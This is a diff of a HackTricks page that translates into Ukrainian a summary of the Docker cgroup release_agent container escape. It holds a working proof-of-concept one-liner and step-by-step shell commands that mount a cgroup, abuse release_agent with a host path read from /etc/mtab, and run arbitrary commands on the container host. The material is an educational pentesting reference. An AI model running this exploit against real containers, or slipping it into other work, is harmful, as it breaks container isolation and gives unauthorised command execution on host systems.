@@ -2,10 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:
+**Для отримання додаткової інформації зверніться до** [**оригінального блогу**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Це лише резюме:
 
 Original PoC:
-
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
@@ -13,49 +12,38 @@ t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
+Доказ концепції (PoC) демонструє метод експлуатації cgroups шляхом створення файлу `release_agent` і виклику його для виконання довільних команд на хості контейнера. Ось розбивка кроків, що входять до процесу:
 
-The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:
-
-1. **Prepare the Environment:**
-   - A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.
-   - The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.
-
+1. **Підготовка середовища:**
+- Директорія `/tmp/cgrp` створюється як точка монтування для cgroup.
+- Контролер cgroup RDMA монтується в цю директорію. У разі відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
-
-2. **Set Up the Child Cgroup:**
-   - A child cgroup named "x" is created within the mounted cgroup directory.
-   - Notifications are enabled for the "x" cgroup by writing 1 to its notify_on_release file.
-
+2. **Налаштуйте дочірній cgroup:**
+- Дочірній cgroup з назвою "x" створюється в змонтованій директорії cgroup.
+- Сповіщення увімкнені для cgroup "x" шляхом запису 1 у його файл notify_on_release.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-
-3. **Configure the Release Agent:**
-   - The path of the container on the host is obtained from the /etc/mtab file.
-   - The release_agent file of the cgroup is then configured to execute a script named /cmd located at the acquired host path.
-
+3. **Налаштуйте Release Agent:**
+- Шлях контейнера на хості отримується з файлу /etc/mtab.
+- Файл release_agent cgroup потім налаштовується для виконання скрипту з назвою /cmd, розташованого за отриманим шляхом хоста.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-
-4. **Create and Configure the /cmd Script:**
-   - The /cmd script is created inside the container and is configured to execute ps aux, redirecting the output to a file named /output in the container. The full path of /output on the host is specified.
-
+4. **Створіть і налаштуйте скрипт /cmd:**
+- Скрипт /cmd створюється всередині контейнера і налаштовується для виконання ps aux, перенаправляючи вихідні дані у файл з назвою /output в контейнері. Повний шлях до /output на хості вказується.
 ```shell
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
-
-5. **Trigger the Attack:**
-   - A process is initiated within the "x" child cgroup and is immediately terminated.
-   - This triggers the `release_agent` (the /cmd script), which executes ps aux on the host and writes the output to /output within the container.
-
+5. **Запустіть атаку:**
+- Процес ініціюється в "x" дочірньому cgroup і відразу ж завершується.
+- Це викликає `release_agent` (скрипт /cmd), який виконує ps aux на хості та записує вихідні дані в /output всередині контейнера.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
-
 {{#include ../../../../banners/hacktricks-training.md}}
